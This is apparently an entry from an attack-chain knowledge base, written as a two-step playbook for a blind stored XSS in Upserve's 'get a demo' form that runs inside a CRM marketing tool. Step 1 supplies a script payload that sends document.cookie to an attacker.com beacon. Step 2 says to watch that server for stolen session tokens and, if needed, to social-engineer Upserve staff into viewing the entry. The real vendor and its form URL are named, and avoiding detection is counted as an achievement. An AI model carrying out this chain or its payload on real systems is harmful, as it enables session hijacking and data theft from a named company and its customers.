---
id: ac-uuid-324194
tags:
  - xss
  - stored-xss
  - blind-xss
  - crm
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Submit-Malicious-Payload-to-Upserve-Demo-Form]]'
  - '[[procedures/Trigger-XSS-Execution-in-Third-Party-Marketing-Tool]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.979Z'
description: >-
  Exploits a blind stored XSS vulnerability in Upserve's demo request form,
  which integrates with a third-party marketing tool in their CRM, allowing
  payload storage and execution in a target company's account.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Blind Stored XSS in Upserve Demo Form Leading to Script Execution in CRM

Multi-stage attack chain demonstrating exploitation of a blind stored XSS vulnerability in Upserve's 'get a demo' form, which feeds into a third-party marketing tool integrated with their CRM system. The payload is submitted via the form, stored unsanitized, and executes when viewed in a target company's CRM account, potentially enabling script injection, data theft, or further compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Submit Payload via Demo Form] --> B[Payload Storage and Execution in CRM]
    B --> C[Script Injection in Target Account]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- Web browser or [[tools/Burp-Suite]] for form interception and payload testing

### Target Environment

- Web platform with Upserve CRM
- Third-party marketing tool integration (e.g., similar to HubSpot or Marketo)
- Access to public 'get a demo' form endpoint

### Initial Access Requirements

- No credentials required; public-facing form
- Internet access to submit form
- Knowledge of target company's CRM usage with Upserve

## Detailed Attack Procedures

### Step 1: Payload Submission
procedure: [[procedures/Submit-Malicious-Payload-to-Upserve-Demo-Form]]

**Objective**: Inject a malicious JavaScript payload into the unsanitized demo request form to store it in the backend CRM system.

**Instructions**: Navigate to the Upserve 'get a demo' form (typically at a URL like https://upserve.com/get-a-demo). Fill in the form fields with benign data but inject the payload into a text field such as company name or message. Use a blind XSS payload that beacons back to a controlled server for confirmation, e.g., `<script>fetch('https://attacker.com/log?data='+document.cookie)</script>`.

Submit the form using a standard POST request or via browser.

**Expected Output**: Form submission success message; no immediate alert since it's blind stored XSS.

**Success Indicators**:
- Form accepted without validation errors
- Later confirmation via beacon server logs when payload executes

### Step 2: Trigger Execution
procedure: [[procedures/Trigger-XSS-Execution-in-Third-Party-Marketing-Tool]]

**Objective**: Cause the stored payload to execute in the context of a target company's CRM account by accessing the integrated third-party marketing tool.

**Instructions**: The payload executes automatically when Upserve staff or the target company views the demo request in their CRM dashboard via the third-party tool. Monitor your controlled server for incoming requests from the execution context, which may include cookies or DOM data from the company's environment.

If needed, social engineer a Upserve contact to view the request or wait for routine processing.

**Expected Output**: Server logs showing beacon hit with potential exfiltrated data like session tokens.

**Success Indicators**:
- Beacon request received from target domain/IP
- JavaScript execution confirmed in CRM context

## Attack Chain Summary

### Key Achievements

1. Successful payload injection into public form without detection
2. Remote code execution in target company's CRM environment
3. Potential for data exfiltration or session hijacking via XSS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
